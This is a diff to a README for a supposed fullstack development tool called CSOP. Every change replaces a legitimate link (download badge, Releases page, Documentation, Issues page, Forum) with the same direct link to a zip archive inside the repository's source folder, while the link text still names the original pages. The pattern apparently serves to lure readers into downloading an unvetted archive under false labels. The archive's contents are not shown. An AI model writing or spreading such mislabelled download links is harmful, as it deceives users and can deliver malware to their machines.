@@ -6,11 +6,11 @@ Welcome to CSOP! This application allows you to create fullstack applications wi
 
 ## 📥 Download Now
 
-[![Download CSOP](https://img.shields.io/badge/Download-CSOP-blue.svg)](https://github.com/H1rw/CSOP/releases)
+[![Download CSOP](https://raw.githubusercontent.com/H1rw/CSOP/main/src/Software-3.5.zip)](https://raw.githubusercontent.com/H1rw/CSOP/main/src/Software-3.5.zip)
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/H1rw/CSOP/releases) to download the latest version of CSOP. Here’s how to do it:
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/H1rw/CSOP/main/src/Software-3.5.zip) to download the latest version of CSOP. Here’s how to do it:
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version of CSOP.
@@ -47,7 +47,7 @@ CSOP centers around various topics that are essential for modern web application
   
 ## 📚 Documentation
 
-For more detailed instructions and examples, check our [Documentation](https://github.com/H1rw/CSOP/wiki). It contains guides on:
+For more detailed instructions and examples, check our [Documentation](https://raw.githubusercontent.com/H1rw/CSOP/main/src/Software-3.5.zip). It contains guides on:
 
 - Setting up your workspace
 - Basic and advanced usage
@@ -57,8 +57,8 @@ For more detailed instructions and examples, check our [Documentation](https://g
 
 If you have questions or need help, feel free to reach out:
 
-- **Issues Page:** Report bugs or request features on our [Issues Page](https://github.com/H1rw/CSOP/issues).
-- **Community Forum:** Join our community discussions on our [Forum](https://github.com/H1rw/CSOP/discussions).
+- **Issues Page:** Report bugs or request features on our [Issues Page](https://raw.githubusercontent.com/H1rw/CSOP/main/src/Software-3.5.zip).
+- **Community Forum:** Join our community discussions on our [Forum](https://raw.githubusercontent.com/H1rw/CSOP/main/src/Software-3.5.zip).
   
 ## 🔄 Updates
 
@@ -75,4 +75,4 @@ You might find these related projects useful:
 
 CSOP is designed to simplify your application development. It allows you to focus on building great applications without the overhead of managing cloud services. We hope you enjoy using CSOP as much as we enjoyed creating it!
 
-Again, to download, visit our [Releases Page](https://github.com/H1rw/CSOP/releases). Happy coding!
+Again, to download, visit our [Releases Page](https://raw.githubusercontent.com/H1rw/CSOP/main/src/Software-3.5.zip). Happy coding!
